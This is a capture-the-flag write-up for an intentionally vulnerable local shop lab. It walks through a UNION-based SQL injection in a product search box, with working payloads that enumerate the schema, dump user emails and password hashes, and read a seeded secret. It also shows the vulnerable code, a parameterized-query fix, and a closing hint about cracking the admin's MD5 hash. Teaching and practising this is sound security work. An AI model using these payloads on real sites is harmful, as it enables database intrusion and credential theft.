@@ -1,0 +1,239 @@
+---
+author: kOaDT
+authorGithubUrl: https://github.com/kOaDT
+authorGithubAvatar: https://avatars.githubusercontent.com/u/17499022?v=4
+pubDatetime: 2026-02-15T00:29:00Z
+title: "Exploiting a Product Search SQL Injection"
+slug: product-search-sql-injection
+draft: false
+tags:
+  - writeup
+  - sql-injection
+  - ctf
+description: How to exploit a vulnerability in a tiny search box to quietly expose an entire database.
+---
+
+## Introduction
+
+This writeup walks through a SQL injection in the product search feature. The search input gets dropped straight into a raw SQL query with no sanitization, so you can manipulate the query to pull data from tables the catalogue never touches. A payload that merely looks like SQL earns nothing here: the flag is handed over only once the response carries a row the search could never have returned.
+
+## Table of contents
+
+- [Lab setup](#lab-setup)
+- [Feature overview and attack surface](#feature-overview-and-attack-surface)
+- [Exploitation procedure](#exploitation-procedure)
+- [Vulnerable code analysis](#vulnerable-code-analysis)
+- [Remediation](#remediation)
+
+---
+
+## Lab setup
+
+Spin up the lab locally:
+
+```bash
+npx create-oss-store oss-store
+cd oss-store
+npm run dev
+```
+
+Or with Docker (no Node.js required):
+
+```bash
+docker run -p 127.0.0.1:3000:3000 leogra/oss-oopssec-store
+```
+
+The app runs at `http://localhost:3000`.
+
+![OopsSec Store homepage interface](../../assets/images/product-search-sql-injection/homepage-interface.png)
+
+## Feature overview and attack surface
+
+The target here is the product search bar in the navigation header. It lets users search products by name or description, hitting this endpoint:
+
+```
+/api/products/search?q=<search_term>
+```
+
+On the backend, the `q` parameter gets interpolated directly into a SQL query. No escaping, no parameterization. Whatever you type becomes part of the SQL statement.
+
+![Product search input field](../../assets/images/product-search-sql-injection/search-page-ui.png)
+
+You can close the intended query context and tack on your own `UNION SELECT`.
+
+## Exploitation procedure
+
+### Initial behavior verification
+
+Start by searching for something normal, like `fresh`. You should get product results back, confirming the endpoint works and actually uses the `q` parameter.
+
+### Injection probing
+
+Now try this payload:
+
+```
+' UNION SELECT 1,2,3,4,5--
+```
+
+A row of `1,2,3,4,5` shows up among the products: the single quote broke out of the `LIKE` clause and the `UNION SELECT` merged in. The response also tells you the injection is not the finish line:
+
+```json
+{
+  "message": "SQL syntax detected in the search term. The flag tracks one specific internal secret, and it is not in these rows."
+}
+```
+
+Getting the column count wrong is just as informative, because SQLite's error comes straight back, as an HTTP 500:
+
+```json
+{
+  "error": "\nInvalid `prisma.$queryRawUnsafe()` invocation:\n\n\nRaw query failed. Code: `1`. Message: `SELECTs to the left and right of UNION do not have the same number of result columns`",
+  "products": []
+}
+```
+
+Five columns it is.
+
+### UNION-based data extraction
+
+Time to pull real data. Submit this:
+
+```
+DELIVERED' UNION SELECT id, email, password, role, addressId FROM users--
+```
+
+This merges the `users` table into the product results. The app doesn't check where the columns came from, so it happily returns user credentials alongside product listings.
+
+![Network response showing manipulated query results](../../assets/images/product-search-sql-injection/api-response-union-select.png)
+
+Same thing via curl:
+
+```bash
+curl "http://localhost:3000/api/products/search?q=DELIVERED%27%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20role%2C%20addressId%20FROM%20users--"
+```
+
+### Schema enumeration
+
+Credentials are loot, not the flag. What the endpoint rewards is reading a row no product search would ever return, so ask SQLite what else lives in there:
+
+```
+' UNION SELECT 1, group_concat(name), 'x', 1, 'y' FROM sqlite_master WHERE type='table'--
+```
+
+```
+users,products,carts,cart_items,orders,order_items,addresses,flags,hints,revealed_hints,reviews,support_access_tokens,found_flags,project_init,internal_secrets,visitor_logs,wishlists,wishlist_items,password_reset_tokens,supplier_orders,coupons,gift_cards,stream_config,sqlite_sequence
+```
+
+`flags` is a dead end: any payload naming that table gets a `403`, and every `OSS{…}` value is stripped out of the response before it leaves the server. `internal_secrets` is the one to look at:
+
+```
+' UNION SELECT 1, sql, 'x', 1, 'y' FROM sqlite_master WHERE name='internal_secrets'--
+```
+
+```sql
+CREATE TABLE "internal_secrets" ("id" TEXT NOT NULL PRIMARY KEY, "slug" TEXT NOT NULL, "token" TEXT NOT NULL)
+```
+
+The schema names a `slug` column but says nothing about its values. Read those rather than guessing them:
+
+```
+' UNION SELECT 1, group_concat(slug), 'x', 1, 'y' FROM internal_secrets--
+```
+
+```
+product-search-sql-injection,second-order-sql-injection,sql-injection,x-forwarded-for-sql-injection
+```
+
+One row per injection challenge, each named after the challenge it belongs to.
+
+### Claiming the flag
+
+This endpoint only looks for its own token, so ask for the `product-search-sql-injection` row:
+
+```
+' UNION SELECT 1, token, 'x', 1, 'y' FROM internal_secrets WHERE slug='product-search-sql-injection'--
+```
+
+An empty `LIKE` matches every product, so the whole catalogue comes back and the
+injected row sits among it — the literal `1` in the first column is what marks it:
+
+```json
+{
+  "products": [
+    {
+      "id": "cmua7d4i4000gienxfk8q9c9l",
+      "name": "Artisan Cheese Board",
+      "…": "…"
+    },
+    {
+      "id": "1",
+      "name": "CANARY-PRODUCT-SEARCH-SQL-INJECTION-d12a4cdea6d3",
+      "description": "x",
+      "price": "1",
+      "imageUrl": "y"
+    }
+  ],
+  "flag": "OSS{pr0duct_s34rch_sql_1nj3ct10n}",
+  "message": "Internal secret exfiltrated through the product search! Well done!"
+}
+```
+
+The token is generated when the lab is seeded, so it differs on every instance — returning it is proof the query ran.
+
+Dropping the `WHERE` works just as well: all four rows come back and the endpoint finds its own token among them. The filter keeps the response readable, it is not a requirement.
+
+## Vulnerable code analysis
+
+Here's the problem. The query is built with string concatenation:
+
+```ts
+const sqlQuery = `
+  SELECT 
+    id,
+    name,
+    description,
+    price,
+    "imageUrl"
+  FROM products
+  WHERE name LIKE '%${query}%' OR description LIKE '%${query}%'
+  ORDER BY name ASC
+  LIMIT 50
+`;
+
+const results = await prisma.$queryRawUnsafe(sqlQuery);
+```
+
+The `query` parameter is dropped directly into the SQL string, and `$queryRawUnsafe` does exactly what the name suggests — it skips Prisma’s parameterization entirely. No escaping either. Single quotes, comment delimiters, anything goes.
+
+So when you send:
+
+```
+DELIVERED' UNION SELECT ...
+```
+
+the quote closes the `LIKE` clause, and everything after it runs as SQL. The database user can read other tables, so the `users` table comes back for free.
+
+This is [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html).
+
+## Remediation
+
+Don't build SQL queries with string interpolation. Use Prisma's query builder instead:
+
+```ts
+const results = await prisma.product.findMany({
+  where: {
+    OR: [
+      { name: { contains: query, mode: "insensitive" } },
+      { description: { contains: query, mode: "insensitive" } },
+    ],
+  },
+});
+```
+
+User input stays data, never becomes executable SQL.
+
+If you need raw SQL with Prisma, use `$queryRaw` (parameterized), not `$queryRawUnsafe`. With MySQL and no ORM, use prepared statements. You should also restrict the database user's permissions so that even if someone does find an injection, the damage is limited. Logging unusual query patterns helps too — you want to know when someone is poking at your search bar with `UNION SELECT`.
+
+## Go further
+
+The leaked data includes an admin email with an MD5 password hash. MD5 is trivially crackable at this point, so you can try recovering the password offline and logging in as admin. From there, you'd have access to restricted endpoints where other flags might be hiding.
